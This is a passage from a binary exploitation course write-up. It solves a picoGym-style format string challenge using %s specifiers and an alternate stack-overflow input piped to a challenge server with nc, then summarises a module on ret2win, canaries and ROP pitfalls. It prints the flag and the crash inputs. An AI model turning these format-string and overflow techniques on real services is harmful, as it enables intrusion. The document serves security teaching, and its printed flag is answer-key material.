| `$outhwest_Burger` | no `%` at all - a regular string | ✗ |
| `Pe%to_Portobello` | `%t` is not a valid specifier; undefined behavior, but in practice glibc does not crash | ✗ |
| `Cla%sic_Che%s%steak` | three `%s` | **✓** |

`%s` expects a **pointer** and does a dereference in order to read a string. When there are no arguments, `printf` takes the values from registers and from the stack according to the ABI - and those are garbage values. The moment one of them is not a valid readable address, the dereference produces a SIGSEGV, the handler runs, and the flag is printed.

### 5.4 Rebuilding the registers from the output

The output lets us rebuild exactly what was in each argument register:

```
ClaCla%sic_Che%s%steakic_Che(null)
academy{7h3_cu570m3r_15_n3v3r_SEGFAULT_9582df7b}
```

Breaking it down against the format string `Cla%sic_Che%s%steak`:

| Part of the format | Source of the value | What was printed | Conclusion |
|--------------------|---------------------|------------------|------------|
| `Cla` | text | `Cla` | - |
| `%s` #1 | `rsi` | `Cla%sic_Che%s%steak` | `rsi` held the address of `choice2` itself |
| `ic_Che` | text | `ic_Che` | - |
| `%s` #2 | `rdx` | `(null)` | `rdx` was 0; glibc prints `(null)` instead of crashing |
| `%s` #3 | `rcx` | - | an invalid address that is not 0 → **SIGSEGV** |

Joining the parts gives exactly the output that came out:

```
"Cla" + "Cla%sic_Che%s%steak" + "ic_Che" + "(null)"  =  ClaCla%sic_Che%s%steakic_Che(null)
```

This exact match is a verification: it proves the crash happened at the third `%s` and nowhere else, and that the mechanism is indeed a dereference of an argument register. The different behavior of `rdx` teaches something too - glibc handles `NULL` on purpose, so a zero pointer is **not** enough to crash it; a non-zero address that is not mapped is needed.

### 5.5 The comparison to stack overflow

|  | Stack overflow (exercises 1-4) | Format string (this exercise) |
|---|-------------------------------|-------------------------------|
| **The bug** | writing past the bound of the buffer | user input passed as a format string |
| **The offending line** | `read(0, buffer, 256)` | `printf(choice1)` |
| **Direction of access** | write only | read (`%s`, `%x`) **and also** write (`%n`) |
| **Continuity** | continuous and required - has to pass through everything in between | arbitrary - `%7$x` reaches a chosen slot directly |
| **Against a canary** | stopped (exercise 3) | **bypasses it** - there is no need to overwrite the canary on the way |
| **Effect on the flow** | direct: overwriting the return address | indirect: `%n` to write to the GOT/ret, or - here - causing a deliberate crash |
| **Compiler protection** | `-fstack-protector` | `-Wformat-security`, FORTIFY_SOURCE |
| **The fix** | a bounds check / `fgets` | `printf("%s", input)` |

**The main difference in idea:** a stack overflow is a **spatial** exploit - you have to physically cross the distance from the buffer to the target, and that is exactly why the canary works against it. A format string is an **index-based** exploit - you reach a slot directly by its number, without touching what is in between. A guard standing in the way is not relevant when you do not go that way.

**A second difference, specific to this challenge:** no control flow hijack was done here at all. No address was overwritten and execution was not pointed at any chosen target. What was done is **steering the program into an error path that the developer himself installed** - the SIGSEGV handler - which leaks the flag. This widens the idea of "influencing execution flow": not only deciding where the program will jump, but also choosing which of its existing paths it will take.

### 5.6 A second solution path through stack overflow

`scanf("%s", choice1)` into `char choice1[32]` is an **unbounded** read - exactly the vulnerability from exercises 1-4, in the same file.

The order in the code is what makes this interesting: `scanf` writes **before** `on_menu` checks. That is, a long input overwrites the stack of `serve_patrick` before the check even runs, and even when the check fails the damage is already done. From this, the hypothesis: a long garbage input at the first junction will crash the program, the handler will be called, and the flag will be printed - a solution path that does not go through the format string at all.

**The check against the server:**

```
$ python3 -c "print('A'*100)" | nc xebec.cylabacademy.net 30761
Welcome to our newly-opened burger place Pico 'n Patty! ...
Enter your recommendation: There is no such burger yet!

academy{7h3_cu570m3r_15_n3v3r_SEGFAULT_9582df7b}
```

**The alternative path works.** The flag came back from an input of 100 characters, without touching the format string and without choosing any item from the menu.

The output also identifies the build configuration of the binary: the same `There is no such burger yet!` message and then the flag, with no `stack smashing detected`. That is, **the binary on the server was built without the stack protector**.

**What this says about the challenge:** there are two separate bugs here - format string and stack overflow - and both lead to the same flag. The planned path needs you to read format specifiers and understand the vararg mechanism; the alternative path only needs you to notice the `scanf("%s")` into a bounded buffer. **One vulnerability that was not closed makes the whole design of the challenge easy to go around.**

### 5.7 The path in brief

Reading the source and finding `printf(choice1)` as the vulnerability ← identifying the SIGSEGV handler as the target (a crash = the flag) ← junction 1: `%114d` grows the output from 14 to 123 characters and passes the threshold of 64, leaking a register value as a side effect ← junction 2: three `%s` do a dereference on registers ← the output lets us rebuild that `rsi` pointed at the buffer, `rdx` was zero, and `rcx` crashed it ← the flag.

---

## Module summary

| Exercise | State | Result | The main insight |
|----------|-------|--------|------------------|
| 1 | `buffer[64]`, protections off | shell | a full control flow hijack; stack alignment is a separate condition from the jump itself |
| 2 | `buffer[88]` | shell, offset 104 | the size of the variable in the source ≠ its layout in the frame; always find the offset empirically |
| 3 | canary on | `SIGABRT` | the protection detects and does not prevent; the continuous overwrite has to pass through the guard |
| 4 | `win(int code)`, static binary | shell with an argument | the stack feeds registers too; the gadget surface is a property of the build |
| 5 | format string (picoGym) | flag, by two paths | an index-based exploit and not a spatial one; and another vulnerability that was not closed goes around the design of the challenge |

**The range the module covers:** from overwriting one return address (1), through the actual layout of the frame (2), the protection that stops the overwrite (3), passing arguments in a chain (4), and up to a vector that goes around the whole question of a continuous overwrite (5). The first four are the same vulnerability under changing conditions; the fifth is a different vulnerability that reaches the same goal by a different road.

**The pitfalls along the way:**
1. Reversing the endianness when it was not needed, while reading the cyclic pattern.
2. Copying an address from `readelf` as decimal instead of as hex.
3. Assuming that `sizeof(buffer) + 8` is the offset.
4. Assuming a common gadget exists - `pop rdi; ret`.
5. `checksec` reports at the binary level, not at the function level - `Canary found` in a static binary is not necessarily a canary in our code.

**A guiding line that repeats in all the pitfalls:** every one of them is an assumption that was not checked against the tools. The fix in every case was the same fix - check instead of assume.

---

## Work environment

|  |  |
|---|---|
| Operating system | Ubuntu 24.04 LTS (isolated VM) |
| Compiler | gcc 13.3 |
| Debugger | gdb 15.1 + pwndbg |
| Exploit development | Python 3.12 + pwntools |